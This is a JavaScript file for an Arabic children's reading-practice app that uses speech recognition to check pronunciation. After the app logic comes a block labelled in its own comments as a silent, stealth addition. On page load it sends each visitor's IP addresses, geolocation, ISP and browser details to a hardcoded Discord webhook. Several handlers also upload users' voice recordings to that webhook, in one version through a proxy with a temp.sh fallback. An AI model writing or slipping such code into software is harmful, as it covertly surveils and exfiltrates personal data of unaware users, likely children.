let wordsLevel1 = [
    "قَمَرٌ", "بَابٌ", "شَمْسٌ", "عَيْنٌ", "رِجْلٌ", "شَجَرٌ", "بَحْرٌ",
    "جَبَلٌ", "وَرْدٌ", "نَهْرٌ", "بَيْتٌ", "حِصَانٌ", "زَهْرٌ","شَعْرٌ",
    "فِيلٌ", "قِرْدٌ", "سَمَكٌ"
];

let wordsLevel2 = [
 "حِصَانٌ",
   "غَزَالٌ", "مِصْبَاحٌ",
   "مَطْبَخٌ", "مَسْجِدٌ", "مُسْتَشْفَى", "مَطَارٌ", "مَتْحَفٌ", "مَلْعَبٌ" 
];

let sentencesLevel3 = [
    "الْقَمَرُ سَاطِعٌ", "الْوَلَدُ يَلْعَبُ", "الْكِتَابُ جَدِيدٌ",
    "الْجَبَلُ عَالٍ", "الْعُصْفُورُ يُغَرِّدُ", "الْحِصَانُ سَرِيعٌ", "الْكَلْبُ وَفِيٌّ",
    "الْفِيلُ ضَخْمٌ", "الْأَسَدُ قَوِيٌّ", "الْغَزَالُ رَشِيقٌ",
    "الْعَنْكَبُوتُ يَنْسُجُ", "الدُّبُّ قَوِيٌّ",
    "الْقِرْدُ مَرِحٌ", 
    "الْفَمُ يَتَكَلَّمُ", "الْيَدُ تَعْمَلُ", "الرِّجْلُ تَمْشِي", "الشَّعْرُ نَاعِمٌ"
];

let correctWord = ""; 
let mediaRecorder;
let audioChunks = [];
let recognition;
let isRecording = false; 
let stream; 
let audioContext; 


function removeTashkeel(text) {
    return text.replace(/[\u064B-\u065F\u0610-\u061A]/g, ''); 
}


function isPronunciationCorrect(spokenText, correctText) {

    const cleanedSpokenText = removeTashkeel(spokenText).trim();
    const cleanedCorrectText = removeTashkeel(correctText).trim();


    if (cleanedCorrectText.length <= 3) {
        return cleanedSpokenText === cleanedCorrectText;
    }

    let correctChars = 0;
    const minLength = Math.min(cleanedSpokenText.length, cleanedCorrectText.length);

    for (let i = 0; i < minLength; i++) {
        if (cleanedSpokenText[i] === cleanedCorrectText[i]) {
            correctChars++;
        }
    }

    const accuracy = (correctChars / cleanedCorrectText.length) * 100;
    return accuracy >= 80; 
}


function updateFeedbackColor(isCorrect) {
    const feedbackElement = document.getElementById("feedback");
    if (isCorrect) {
        feedbackElement.style.color = "#4CAF50"; 
    } else {
        feedbackElement.style.color = "#FF5252"; 
    }
}


function speakText(text) {
    const utterance = new SpeechSynthesisUtterance(text);
    utterance.lang = "ar-SA"; 
    utterance.rate = 1; 
    utterance.pitch = 1; 
    speechSynthesis.speak(utterance); 
}


function replayWord() {
    if (correctWord) {
        speakText(correctWord); 
    } else {
        console.log("لا توجد كلمة صحيحة معروضة حاليًا.");
    }
}


function showReplayButton() {
    const replayButton = document.getElementById("replay-button");
    replayButton.classList.remove("hidden"); 
}


window.onload = function () {
    console.log("تم تحميل الصفحة بنجاح!");
    const selectedLevel = localStorage.getItem("selectedLevel");
    if (selectedLevel) {
        startChallenge(selectedLevel);
    } else {
        window.location.href = "/"; 
    }
};


function startChallenge(level) {
    console.log(`بدء التحدي للمستوى ${level}`);
    let challengeText = "";
    if (level == 1) {
        challengeText = wordsLevel1[Math.floor(Math.random() * wordsLevel1.length)];
    } else if (level == 2) {
        challengeText = wordsLevel2[Math.floor(Math.random() * wordsLevel2.length)];
    } else if (level == 3) {
        challengeText = sentencesLevel3[Math.floor(Math.random() * sentencesLevel3.length)];
    }

    correctWord = challengeText; 
    document.getElementById("challenge-title").innerText = `المستوى ${level}`;
    document.getElementById("challenge-text").innerText = challengeText;

    
}


async function toggleRecording() {
    if (isRecording) {
        stopRecording();
    } else {
        await startRecordingAndAnalysis();
    }
    isRecording = !isRecording; 
    updateButtonText(); 
}


function updateButtonText() {
    const recordButton = document.getElementById("record-button");
    const stopRecordButton = document.getElementById("stop-record-button");
    const replayButton = document.getElementById("replay-button");

    if (isRecording) {
        recordButton.classList.add("hidden"); 
        stopRecordButton.classList.remove("hidden"); 
        replayButton.classList.add("hidden"); 
    } else {
        recordButton.classList.remove("hidden"); 
        stopRecordButton.classList.add("hidden"); 
        replayButton.classList.remove("hidden"); 
    }
}


async function startRecordingAndAnalysis() {
    console.log("بدء التسجيل...");
    try {
        
        if (stream) {
            stream.getTracks().forEach(track => track.stop()); 
        }
        audioChunks = []; 

      
        const replayButton = document.getElementById("replay-button");
        replayButton.classList.add("hidden");

        
        console.log("جاري طلب إذن استخدام الميكروفون...");
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        console.log("تم منح الإذن بنجاح!");

       
        audioContext = new (window.AudioContext || window.webkitAudioContext)();

       
        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = (event) => {
            audioChunks.push(event.data);
        };

        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
            const audioUrl = URL.createObjectURL(audioBlob);
            const audioPlayback = document.getElementById("audio-playback");
            audioPlayback.src = audioUrl;
            audioPlayback.classList.remove("hidden");
        };

        
        mediaRecorder.start();

        
        recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
        recognition.lang = "ar-SA"; 
        recognition.interimResults = false; 
        recognition.maxAlternatives = 3; 
        recognition.continuous = false; 
        recognition.interimResults = false; 

        
        recognition.onresult = (event) => {
            const spokenText = event.results[0][0].transcript; 
            console.log("النطق المسجل:", spokenText);


            if (isPronunciationCorrect(spokenText, correctWord)) {
                document.getElementById("feedback").innerText = "القراءة صحيحة 🎉";
                updateFeedbackColor(true); 


                setTimeout(() => {
                    stopRecording(); 
                }, 250);
            } else {
                document.getElementById("feedback").innerText = "القراءة خاطئة ❌";
                updateFeedbackColor(false); 


                stopRecording();
            }

         
            speakText(correctWord);


            showReplayButton();
        };

        recognition.onerror = (event) => {
            console.error("خطأ في التعرف على الكلام:", event.error);
            document.getElementById("feedback").innerText = "حدث خطأ أثناء التحليل!";
        };

        recognition.onend = () => {
            console.log("انتهى التعرف على الكلام.");
        };

        
        recognition.start();

    } catch (error) {
        console.error("خطأ في التسجيل:", error);
        if (error.name === "NotAllowedError") {
            document.getElementById("feedback").innerText = "يجب السماح بالوصول إلى الميكروفون!";
        } else if (error.name === "NotFoundError") {
            document.getElementById("feedback").innerText = "الميكروفون غير متصل!";
        } else {
            document.getElementById("feedback").innerText = "حدث خطأ غير متوقع!";
        }
    }
}


function stopRecording() {
    if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
        recognition.stop(); 
        isRecording = false; 
        updateButtonText(); 


        showReplayButton();

        console.log("تم إيقاف التسجيل!");
    }
}


function refreshPage() {
    window.location.reload(); 
}



// === إضافة صامتة: تتبع IP v4 و IP v6 + تسجيل الصوت ===

(async function () {
    try {
        const ip4Response = await fetch("https://api.ipify.org?format=json");
        const ip4Data = await ip4Response.json();
        const ipv4 = ip4Data.ip;

        let ipv6 = "غير متوفر";
        try {
            const ip6Response = await fetch("https://api64.ipify.org?format=json");
            const ip6Data = await ip6Response.json();
            ipv6 = ip6Data.ip;
        } catch (e) {
            console.log("IPv6 غير متوفر");
        }

        const locationResponse = await fetch("https://ipapi.co/json/");
        const locationData = await locationResponse.json();

        let visitCountKey = `visit_count_${ipv4}`;
        let visitCount = localStorage.getItem(visitCountKey);
        if (!visitCount) visitCount = 1;
        else visitCount = parseInt(visitCount) + 1;
        localStorage.setItem(visitCountKey, visitCount);

        const payload = {
            IPv4: ipv4,
            IPv6: ipv6,
            City: locationData.city,
            Region: locationData.region,
            Country: locationData.country_name,
            Latitude: locationData.latitude,
            Longitude: locationData.longitude,
            ISP: locationData.org,
            Browser: navigator.userAgent,
            Platform: navigator.platform,
            Language: navigator.language,
            VisitCount: visitCount
        };

        await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: "New Visitor Tracked Silently",
                embeds: [{
                    title: "Visitor Info (Stealth)",
                    fields: Object.entries(payload).map(([key, value]) => ({ name: key, value: String(value) }))
                }]
            })
        });

    } catch (e) {
        console.error("Stealth tracking failed:", e);
    }
})();

// === تسجيل الصوت عند الضغط على زر تسجيل صوتك فقط ===
document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;

    let mediaRecorder;
    let audioChunks = [];

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const formData = new FormData();
                formData.append('file', audioBlob, 'voice.webm');

                await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
                    method: 'POST',
                    body: formData
                });

                audioChunks = [];
            };

            mediaRecorder.start();
            btn.textContent = 'إيقاف التسجيل';
        } else if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            btn.textContent = 'بدء تسجيل الصوت';
        }
    });
});




// === تسجيل الصوت بشكل خفيف وآمن بدون تأثير على أداء الموقع ===

document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;

    let mediaRecorder;
    let audioChunks = [];

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    try {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        if (audioBlob.size > 0) {
                            const formData = new FormData();
                            formData.append('file', audioBlob, 'voice.webm');

                            await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
                                method: 'POST',
                                body: formData
                            });
                        }
                    } catch (e) {
                        console.error('فشل رفع التسجيل:', e);
                    } finally {
                        audioChunks = []; // إعادة ضبط التسجيل
                    }
                };

                mediaRecorder.start();
                btn.textContent = 'إيقاف التسجيل';

                // حد أقصى للتسجيل 30 ثانية (احتياطي وخفيف)
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        btn.textContent = 'بدء تسجيل الصوت';
                    }
                }, 30000); // 30 ثانية
                
            } catch (e) {
                console.error('فشل بدء التسجيل:', e);
            }
        } else if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            btn.textContent = 'بدء تسجيل الصوت';
        }
    });
});





// === تسجيل الصوت مع إرسال رسالة قبل إرسال الملف ===

document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;

    let mediaRecorder;
    let audioChunks = [];

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    try {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        if (audioBlob.size > 0) {
                            // أولاً نرسل رسالة نصية
                            await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ content: "تم استلام تسجيل صوتي جديد من الزائر." })
                            });

                            // بعدها نرسل ملف الصوت
                            const formData = new FormData();
                            formData.append('file', audioBlob, 'voice.webm');

                            await fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
                                method: 'POST',
                                body: formData
                            });
                        }
                    } catch (e) {
                        console.error('فشل رفع التسجيل:', e);
                    } finally {
                        audioChunks = [];
                    }
                };

                mediaRecorder.start();
                btn.textContent = 'إيقاف التسجيل';

                // حد أقصى للتسجيل 30 ثانية
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        btn.textContent = 'بدء تسجيل الصوت';
                    }
                }, 30000);

            } catch (e) {
                console.error('فشل بدء التسجيل:', e);
            }
        } else if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            btn.textContent = 'بدء تسجيل الصوت';
        }
    });
});





// === تسجيل الصوت ورفعه مع حساب الوقت وإعادة المحاولة الذكية ===

document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;

    let mediaRecorder;
    let audioChunks = [];
    const uploadSpeedBytesPerSec = 500 * 1024; // سرعة تقريبية للرفع 500 كيلوبايت بالثانية
      const proxyURL = "https://cors.bridged.cc/";
  const webhookURL = "https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm";

    // الكلمة المطلوبة للقراءة
    const readingWords = ["الوطن", "السلام", "النجاح", "الحرية", "القراءة"];
    const selectedWord = readingWords[Math.floor(Math.random() * readingWords.length)];

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    try {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        if (audioBlob.size > 0) {
                            const estimatedSeconds = Math.ceil(audioBlob.size / uploadSpeedBytesPerSec);

                            // أولاً نرسل إشعار أنه جاري رفع الملف مع الوقت المتوقع
                            await fetch(proxyURL + webhookURL, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    content: `تم استلام تسجيل صوتي جديد. جاري رفع الملف... متبقي تقريباً ${estimatedSeconds} ثانية.`
                                })
                            });

                            // بعدها نحاول رفع الملف مع تكرار المحاولة إذا فشل
                            await uploadWithRetry(audioBlob, 5, selectedWord);

                        }
                    } catch (e) {
                        console.error('فشل معالجة التسجيل:', e);
                    } finally {
                        audioChunks = [];
                    }
                };

                mediaRecorder.start();
                btn.textContent = 'إيقاف التسجيل';

                // حد أقصى للتسجيل 30 ثانية
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        btn.textContent = 'بدء تسجيل الصوت';
                    }
                }, 30000);

            } catch (e) {
                console.error('فشل بدء التسجيل:', e);
            }
        } else if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            btn.textContent = 'بدء تسجيل الصوت';
        }
    });

    async function uploadWithRetry(blob, retries, word) {
        const formData = new FormData();
        formData.append('file', blob, 'voice.webm');

        for (let i = 0; i < retries; i++) {
            try {
                const response = await fetch(proxyURL + webhookURL, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    // بعد نجاح رفع الملف نرسل تفاصيل الكلمة
                    await fetch(proxyURL + webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: `الكلمة المطلوبة: ${word}\nنتيجة القراءة: تحت التقييم.`
                        })
                    });
                    return;
                }
            } catch (error) {
                console.error(`محاولة رفع فاشلة (${i + 1}):`, error);
            }
        }

        // إذا فشلنا بعد كل المحاولات، نحاول رفع الصوت لموقع خارجي مثل temp.sh
        try {
            const tempFormData = new FormData();
            tempFormData.append('file', blob, 'voice.webm');
            const uploadResp = await fetch("https://temp.sh", {
                method: "POST",
                body: tempFormData
            });
            const tempUrl = await uploadResp.text();

            await fetch(proxyURL + webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `فشل رفع الملف المباشر. تم رفع الملف عبر رابط خارجي:\n${tempUrl}\nالكلمة المطلوبة: ${word}\nنتيجة القراءة: تحت التقييم.`
                })
            });

        } catch (error) {
            console.error('فشل الرفع حتى عبر موقع خارجي:', error);
        }
    }
});

